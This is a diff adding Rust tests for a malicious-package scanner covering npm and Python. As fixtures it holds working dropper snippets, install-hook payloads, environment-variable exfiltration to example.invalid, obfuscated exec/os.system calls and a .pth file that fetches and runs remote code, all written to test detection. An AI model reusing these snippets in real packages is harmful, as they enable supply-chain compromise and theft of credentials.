@@ -3490,3 +3490,513 @@ setup(name='droppy', version='1.0.0'%DEPS%)
     assert!(matches!(py_level, PyRisk::Critical), "{py_level:?}");
     assert!(py_combined > py_alone);
 }
+
+// ---------------------------------------------------------------------------
+// Round 7: package tools
+// ---------------------------------------------------------------------------
+
+fn r7_npm(files: &[(&str, &str)]) -> (NpmRisk, f32, Vec<String>) {
+    let dir = r6_npm_dir(files);
+    let m = analyze_npm_package(dir.path())
+        .unwrap()
+        .malicious_indicators;
+    (m.risk_level, m.overall_risk_score, m.risk_reasons)
+}
+
+fn r7_py(files: &[(&str, &str)]) -> (PyRisk, f32, Vec<String>) {
+    let dir = TempDir::new().unwrap();
+    for (name, body) in files {
+        write(dir.path(), name, body.as_bytes());
+    }
+    let m = analyze_python_package(dir.path())
+        .unwrap()
+        .malicious_indicators;
+    (m.risk_level, m.overall_risk_score, m.risk_reasons)
+}
+
+fn is_high(level: &NpmRisk) -> bool {
+    matches!(level, NpmRisk::High | NpmRisk::Critical)
+}
+
+#[test]
+fn an_update_check_next_to_a_generic_runner_is_not_a_dropper() {
+    let manifest = r#"{"name":"task-kit","version":"1.0.0"}"#;
+    let cli = "const https = require('https');
+const fs = require('fs');
+const { spawn } = require('child_process');
+function checkUpdate() {
+  https.get('https://registry.example.invalid/task-kit/latest', (r) => {
+    let d = ''; r.on('data', (c) => (d += c)); r.on('end', () => fs.writeFileSync('/tmp/task-kit-latest.json', d));
+  });
+}
+function run(command, args) {
+  return spawn(command, args, { stdio: 'inherit' });
+}
+module.exports = { checkUpdate, run };
+";
+    let (level, _, _) = r7_npm(&[("package.json", manifest), ("cli.js", cli)]);
+    assert!(!is_high(&level), "{level:?}");
+    // The real dropper: what was written is what is run.
+    let dropper = "const https = require('https');
+const fs = require('fs');
+const { exec } = require('child_process');
+const out = '/tmp/payload.sh';
+https.get('https://example.invalid/p.sh', (r) => {
+  let d = ''; r.on('data', (c) => (d += c));
+  r.on('end', () => {
+    fs.writeFileSync(out, d);
+    exec('sh ' + out);
+  });
+});
+";
+    let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", dropper)]);
+    assert!(is_high(&level), "{level:?}");
+    // Sharing the written path with the run is enough, with no shell named.
+    let direct = "const https = require('https');
+const fs = require('fs');
+const { execFile } = require('child_process');
+const dest = '/tmp/tool-bin';
+https.get('https://example.invalid/b', (r) => {
+  r.on('end', () => {
+    fs.writeFileSync(dest, 'x');
+    execFile(dest);
+  });
+});
+";
+    let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", direct)]);
+    assert!(is_high(&level), "{level:?}");
+    // `node:` module specifier in a generic runner is not an interpreter.
+    let nodecp = cli
+        .replace(
+            "const { spawn } = require('child_process');",
+            "const cp = require('node:child_process');",
+        )
+        .replace("return spawn(", "return cp.spawn(");
+    let (level, _, _) = r7_npm(&[("package.json", manifest), ("cli.js", &nodecp)]);
+    assert!(!is_high(&level), "{level:?}");
+    // A destination variable called `name` still ties the write to the run.
+    let named = "const https = require('https');
+const fs = require('fs');
+const cp = require('child_process');
+const name = '/tmp/tool-bin';
+https.get('https://example.invalid/b', (r) => {
+  r.on('end', () => {
+    fs.writeFileSync(name, 'x', { mode: 0o755 });
+    cp.execFile(name);
+  });
+});
+";
+    let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", named)]);
+    assert!(is_high(&level), "{level:?}");
+}
+
+#[test]
+fn a_python_dropper_with_a_destination_called_path_is_still_found() {
+    let dropper = "import os, subprocess, tempfile, urllib.request
+
+def go(url):
+    path = os.path.join(tempfile.gettempdir(), 'u.bin')
+    urllib.request.urlretrieve(url, path)
+    os.chmod(path, 0o755)
+    subprocess.Popen([path])
+";
+    let (level, _, _) = r7_py(&[
+        (
+            "pyproject.toml",
+            "[project]\nname = \"helperkit\"\nversion = \"1.0\"\n",
+        ),
+        ("helperkit/__init__.py", dropper),
+    ]);
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+}
+
+#[test]
+fn a_dropper_that_keeps_its_destination_in_a_field_is_still_a_dropper() {
+    // The destination is `self.path` / `this.path`: both words are common ones, and the
+    // run names the same field.
+    let py = "import os, subprocess, urllib.request
+
+class Updater:
+    def go(self, url):
+        urllib.request.urlretrieve(url, self.path)
+        os.chmod(self.path, 0o755)
+        subprocess.Popen([self.path])
+";
+    let (level, _, reasons) = r7_py(&[
+        (
+            "pyproject.toml",
+            "[project]\nname = \"selfpath\"\nversion = \"1.0\"\n",
+        ),
+        ("m/__init__.py", py),
+    ]);
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?} {reasons:?}"
+    );
+    let js = "const https = require('https');
+const fs = require('fs');
+const cp = require('child_process');
+class Updater {
+  go(url) {
+    https.get(url, (r) => {
+      let d = ''; r.on('data', (c) => (d += c));
+      r.on('end', () => { fs.writeFileSync(this.path, d, { mode: 0o755 }); cp.execFile(this.path); });
+    });
+  }
+}
+module.exports = Updater;
+";
+    let (level, _, reasons) = r7_npm(&[
+        ("package.json", r#"{"name":"thispath","version":"1.0.0"}"#),
+        ("index.js", js),
+    ]);
+    assert!(is_high(&level), "{level:?} {reasons:?}");
+    // The destination is the same expression at the write and at the run, made of common
+    // words only (`path.join(os.tmpdir(), name)`), in a file an install hook runs.
+    let setup = "const https = require('https');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const cp = require('child_process');
+const name = 'u-' + process.pid;
+https.get('https://example.invalid/u', res => {
+  let d = '';
+  res.on('data', c => d += c);
+  res.on('end', () => {
+    fs.writeFileSync(path.join(os.tmpdir(), name), d, { mode: 0o755 });
+    cp.execFile(path.join(os.tmpdir(), name));
+  });
+});
+";
+    let (level, _, reasons) = r7_npm(&[
+        (
+            "package.json",
+            r#"{"name":"jointmp","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}"#,
+        ),
+        ("index.js", "module.exports = {};\n"),
+        ("scripts/setup.js", setup),
+    ]);
+    assert!(is_high(&level), "{level:?} {reasons:?}");
+}
+
+#[test]
+fn the_way_child_process_is_imported_does_not_tie_a_generic_runner_to_a_write() {
+    // TypeScript output and dynamic import spell the module `node:child_process`; the word
+    // `node` there is not an interpreter being started.
+    for (file, import) in [
+        (
+            "cli.js",
+            "const cp = __importStar(require(\"node:child_process\"));",
+        ),
+        ("cli.mjs", "const cp = await import('node:child_process');"),
+        ("cli2.js", "const cp = require('node:child_process');"),
+    ] {
+        let cli = format!(
+            "const https = require('https');
+const fs = require('fs');
+{import}
+function checkUpdate() {{
+  https.get('https://registry.example.invalid/task-kit/latest', (r) => {{
+    let d = ''; r.on('data', (c) => (d += c)); r.on('end', () => fs.writeFileSync('/tmp/task-kit-latest.json', d));
+  }});
+}}
+function run(command, args) {{
+  return cp.spawn(command, args, {{ stdio: 'inherit' }});
+}}
+module.exports = {{ checkUpdate, run }};
+"
+        );
+        let (level, _, reasons) = r7_npm(&[
+            ("package.json", r#"{"name":"task-kit","version":"1.0.0"}"#),
+            (file, &cli),
+        ]);
+        assert!(!is_high(&level), "{import}: {level:?} {reasons:?}");
+    }
+}
+
+#[test]
+fn a_python_download_helper_and_a_run_helper_are_not_a_dropper() {
+    let helper = "import subprocess, urllib.request
+
+def fetch_index(dest):
+    urllib.request.urlretrieve('https://example.invalid/index.json', dest)
+
+def run(cmd):
+    return subprocess.run(cmd)
+";
+    let (level, _, _) = r7_py(&[
+        (
+            "pyproject.toml",
+            "[project]\nname = \"helperkit\"\nversion = \"1.0\"\n",
+        ),
+        ("helperkit/__init__.py", helper),
+    ]);
+    assert!(
+        !matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+    let dropper = "import subprocess, urllib.request
+
+def go(dest):
+    urllib.request.urlretrieve('https://example.invalid/x', dest)
+    subprocess.run([dest])
+";
+    let (level, _, _) = r7_py(&[
+        (
+            "pyproject.toml",
+            "[project]\nname = \"helperkit\"\nversion = \"1.0\"\n",
+        ),
+        ("helperkit/__init__.py", dropper),
+    ]);
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+}
+
+#[test]
+fn one_named_variable_next_to_a_url_is_configuration() {
+    let manifest = r#"{"name":"envdemo","version":"1.0.0"}"#;
+    for line in [
+        "const base = process.env.API_URL || 'https://api.example.invalid/v2';",
+        "const c = axios.create({ baseURL: process.env.BASE_URL });",
+        "module.exports = () => fetch(process.env.SERVICE_URL + '/health');",
+        "if (process.env.HTTPS_PROXY) agent = new Agent(process.env['HTTPS_PROXY']); // https://example.invalid/docs",
+        "client.post('/v1/messages', { model: process.env.MODEL || 'default' });",
+    ] {
+        let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", line)]);
+        assert!(!is_high(&level), "{line}: {level:?}");
+    }
+    for line in [
+        "fetch('https://example.invalid/c', { method: 'POST', body: JSON.stringify(process.env) });",
+        "axios.post('https://example.invalid/c', process.env);",
+    ] {
+        let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", line)]);
+        assert!(is_high(&level), "{line}: {level:?}");
+    }
+    let meta = "[project]\nname = \"envdemo\"\nversion = \"1.0\"\n";
+    for line in [
+        "import os, requests\nrequests.get(os.environ[\"SERVICE_URL\"] + \"/health\")",
+        "import os, socket\nHOST = os.getenv(\"STATSD_HOST\", socket.gethostname())",
+        "import os, urllib.request\nproxy = os.environ.get(\"HTTPS_PROXY\")  # urllib below",
+    ] {
+        let (level, _, _) = r7_py(&[("pyproject.toml", meta), ("envdemo/__init__.py", line)]);
+        assert!(
+            !matches!(level, PyRisk::High | PyRisk::Critical),
+            "{line}: {level:?}"
+        );
+    }
+    for line in [
+        "import requests, os\nrequests.post('https://example.invalid/c', data=dict(os.environ))",
+        "import requests, os\nrequests.post('https://example.invalid/c', json=os.environ.copy())",
+    ] {
+        let (level, _, _) = r7_py(&[("pyproject.toml", meta), ("envdemo/__init__.py", line)]);
+        assert!(
+            matches!(level, PyRisk::High | PyRisk::Critical),
+            "{line}: {level:?}"
+        );
+    }
+}
+
+#[test]
+fn a_decoded_command_in_a_file_a_hook_runs_is_high() {
+    let hex = "require('child_process').exec(Buffer.from('6375726c202d73','hex').toString());\n";
+    let hooked = r#"{"name":"obf-demo","version":"1.0.0","scripts":{"postinstall":"node i.js"}}"#;
+    let (level, _, reasons) = r7_npm(&[("package.json", hooked), ("i.js", hex)]);
+    assert!(is_high(&level), "{level:?}");
+    assert!(
+        reasons.iter().any(|r| r.contains("install-time")),
+        "{reasons:?}"
+    );
+    // Char-code blob in a hook-run file: obfuscation alone counts there.
+    let codes = "const s=String.fromCharCode(99,117,114,108,32,45,115,32,104,116,116,112,115);require('child_'+'process')['ex'+'ec'](s);\n";
+    let (level, _, _) = r7_npm(&[("package.json", hooked), ("i.js", codes)]);
+    assert!(is_high(&level), "{level:?}");
+    // The same obfuscated file that no hook runs is not moved by the hook rule.
+    let plain = r#"{"name":"obf-demo","version":"1.0.0"}"#;
+    let blob =
+        "var _0x4a2f=['a','b'];function _0x1b2c(i){return _0x4a2f[i];}module.exports=_0x1b2c;\n";
+    let (level, _, _) = r7_npm(&[("package.json", plain), ("index.js", blob)]);
+    assert!(!is_high(&level), "{level:?}");
+    let (level, _, _) = r7_npm(&[("package.json", hooked), ("i.js", blob)]);
+    assert!(is_high(&level), "{level:?}");
+
+    // Python: a decoded string handed to os.system, also through __import__.
+    for setup in [
+        "from setuptools import setup\nimport base64, os\nos.system(base64.b64decode('Y3VybA==').decode())\nsetup(name='padutils', version='1.0')\n",
+        "from setuptools import setup\n(lambda _: __import__('os').system(__import__('base64').b64decode(_).decode()))('Y3VybA==')\nsetup(name='padutils', version='1.0')\n",
+    ] {
+        let (level, _, _) = r7_py(&[("setup.py", setup)]);
+        assert!(matches!(level, PyRisk::High | PyRisk::Critical), "{level:?}");
+    }
+    // An ordinary setup.py with a subprocess stays low.
+    let ok = "from setuptools import setup\nimport subprocess\nsubprocess.check_call(['make'])\nsetup(name='okpkg', version='1.0')\n";
+    let (level, _, _) = r7_py(&[("setup.py", ok)]);
+    assert!(
+        !matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?}"
+    );
+}
+
+#[test]
+fn install_hooks_are_followed_through_cd_variables_and_bare_paths() {
+    let dropper = "const https = require('https');
+const fs = require('fs');
+const { exec } = require('child_process');
+const out = '/tmp/payload.sh';
+https.get('https://example.invalid/p.sh', (r) => {
+  r.on('end', () => {
+    fs.writeFileSync(out, 'x');
+    exec('sh ' + out);
+  });
+});
+";
+    let cases: [(&str, &str); 4] = [
+        ("cd scripts && node setup.js", "scripts/setup.js"),
+        (
+            "NODE_ENV=production node lib/internal/post.js || true",
+            "lib/internal/post.js",
+        ),
+        ("node scripts/setup", "scripts/setup.js"),
+        ("node scripts", "scripts/index.js"),
+    ];
+    for (hook, file) in cases {
+        let manifest = json!({
+            "name": "hooked", "version": "1.0.0", "scripts": {"install": hook}
+        })
+        .to_string();
+        let (level, _, reasons) = r7_npm(&[("package.json", manifest.as_str()), (file, dropper)]);
+        assert!(is_high(&level), "{hook}: {level:?}");
+        assert!(
+            reasons.iter().any(|r| r.contains("install-time")),
+            "{hook}: {reasons:?}"
+        );
+    }
+    // A path that leaves the package is not followed.
+    let manifest = json!({
+        "name": "hooked", "version": "1.0.0", "scripts": {"install": "cd .. && node setup.js"}
+    })
+    .to_string();
+    let (_, _, reasons) = r7_npm(&[("package.json", manifest.as_str()), ("setup.js", dropper)]);
+    assert!(
+        !reasons.iter().any(|r| r.contains("install-time")),
+        "{reasons:?}"
+    );
+}
+
+#[test]
+fn a_known_malicious_python_release_is_named_with_its_version() {
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "requirements.txt", b"ctx==0.1.2\n");
+    let analysis = analyze_python_package(&dir.path().join("requirements.txt")).unwrap();
+    let list = &analysis
+        .dependencies
+        .vulnerability_summary
+        .malicious_releases;
+    assert_eq!(list, &vec!["ctx==0.1.2".to_string()]);
+    assert!(
+        analysis
+            .malicious_indicators
+            .risk_reasons
+            .iter()
+            .any(|r| r.contains("ctx==0.1.2")),
+        "{:?}",
+        analysis.malicious_indicators.risk_reasons
+    );
+}
+
+#[tokio::test]
+async fn package_next_steps_say_what_they_give_and_a_wheel_pth_is_named() {
+    let client = client().await;
+    // next_steps use `gives`, never `why`.
+    let dir = r6_npm_dir(&[("package.json", PKG), ("index.js", "module.exports = 1;\n")]);
+    let answer = summary(&client, "analyze_npm_package", dir.path()).await;
+    for step in answer["next_steps"].as_array().unwrap() {
+        assert!(
+            step["gives"].is_string() && step.get("why").is_none(),
+            "{step}"
+        );
+    }
+    // A wheel that ships an executable .pth does not read as clean.
+    let wheel = zip_of(&[
+        (
+            "boot-0.1.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: boot\nVersion: 0.1.0\n",
+        ),
+        ("boot-0.1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
+        ("boot/__init__.py", b"X = 1\n"),
+        (
+            "zz_boot.pth",
+            b"import urllib.request; exec(urllib.request.urlopen('https://example.invalid/s.py').read())\n",
+        ),
+    ]);
+    let tmp = TempDir::new().unwrap();
+    let path = write(tmp.path(), "boot-0.1.0-py3-none-any.whl", &wheel);
+    let (is_error, text) = call(
+        &client,
+        "analyze_python_package",
+        json!({"package_path": path, "section": "scripts"}),
+    )
+    .await;
+    assert!(!is_error, "{text}");
+    let view: Value = serde_json::from_str(&text).unwrap();
+    let ops = view["dangerous_operations"].as_array().unwrap();
+    assert!(!ops.is_empty(), "{view}");
+    assert!(ops[0]["location"]
+        .as_str()
+        .unwrap()
+        .starts_with("zz_boot.pth:1"));
+    assert!(view["note"].as_str().unwrap().contains(".pth"));
+    // A wheel without one still says it runs nothing.
+    let clean = zip_of(&[
+        (
+            "ok-0.1.0.dist-info/METADATA",
+            b"Metadata-Version: 2.1\nName: ok\nVersion: 0.1.0\n",
+        ),
+        ("ok-0.1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
+        ("ok/__init__.py", b"X = 1\n"),
+    ]);
+    let path = write(tmp.path(), "ok-0.1.0-py3-none-any.whl", &clean);
+    let (_, text) = call(
+        &client,
+        "analyze_python_package",
+        json!({"package_path": path, "section": "scripts"}),
+    )
+    .await;
+    let view: Value = serde_json::from_str(&text).unwrap();
+    assert_eq!(view["dangerous_operations"], json!([]));
+    assert!(view["note"].as_str().unwrap().contains("runs none"));
+}
+
+#[tokio::test]
+async fn registry_name_errors_quote_a_specifier_a_shell_would_misread() {
+    let client = client().await;
+    let (is_error, text) = call(
+        &client,
+        "analyze_python_package",
+        json!({"package_path": "django>=4"}),
+    )
+    .await;
+    assert!(is_error);
+    assert!(
+        text.contains("pip download 'django>=4' --no-deps"),
+        "{text}"
+    );
+    let (_, text) = call(
+        &client,
+        "analyze_npm_package",
+        json!({"package_path": "lodash@^4"}),
+    )
+    .await;
+    assert!(text.contains("npm pack 'lodash@^4'"), "{text}");
+    let (_, text) = call(
+        &client,
+        "analyze_npm_package",
+        json!({"package_path": "express"}),
+    )
+    .await;
+    assert!(text.contains("npm pack express"), "{text}");
+}
